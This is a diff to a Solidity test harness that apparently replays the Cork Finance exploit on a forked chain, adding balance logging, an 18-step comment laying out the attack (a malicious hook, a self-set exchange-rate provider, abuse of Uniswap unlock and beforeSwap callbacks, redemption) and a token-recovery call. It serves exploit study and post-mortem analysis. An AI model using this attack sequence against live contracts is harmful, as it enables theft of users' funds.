@@ -82,6 +82,7 @@ contract Exploit_CorkFinance is TestHarness, TokenBalanceTracker {
     }
 
     function test_triggerAttack() external {
+        logBalancesWithLabel("Attacker initial balances", address(this));
         // Malicious Hook, deployed at 0x81ffe2a832684979d510928e069dbef62da22a757afd55234f851cbe44fa0399
         // Before making the steps 1.
         maliciousHook = new CorkMaliciousHook(
@@ -131,9 +132,35 @@ contract Exploit_CorkFinance is TestHarness, TokenBalanceTracker {
 
         /*
         Steps made on 3: 0xfd89cdd0be468a564dd525b222b728386d7c6780cf7b2f90d2b54493be09f64d
+        1. Pull LP and wstETH tokens from EOA
+        2. Make two calls to getDeployedSwapAssets to identify the CT
+        3. Retrieve reserves of Cork
+        4. Perform the swap
+        5. Reset approvals
+        6. Deposit wstETH to Module Core
+        7. Reset approvals
+        8. Initialize a new module core, setting self as the ExchangeRateProvider. This call sets CONFIG as
+        the attacker's contract, allowing issuing new DS
+        9. Issue new tokens (wstETH5DS-3, wstETH5CT-3)
+        10. Approve and deposits tokens to Cork Module Core
+        11. Call unlock() at Uniswap passing calldata to be executed at its callback
+        12. Retrieve necessary information to craft the beforeSwap call
+        13. Settle tokens
+        14. Make a subsequent call to cork's beforeSwap but this time without callback data
+        15. Call returnRaWithCtDs to start the redemption (cashout) process
+        16. Sync the pool reserves to settle ETH8-DS2
+        17. End the redemption process
+        18. Reset approvals
         */
         vm.roll(22_581_019);
         maliciousHook.attack();
+
+        /*
+        Recover tokens on tx 0x605e653fb580a19f26dfa0a6f1366fac053044ac5004e1b10e7901b058150c50
+        */
+
+        maliciousHook.recoverToken(address(this), address(wstETH));
+        logBalancesWithLabel("Attacker final balances", address(this));
     }
 
     function issueNewDs() internal {
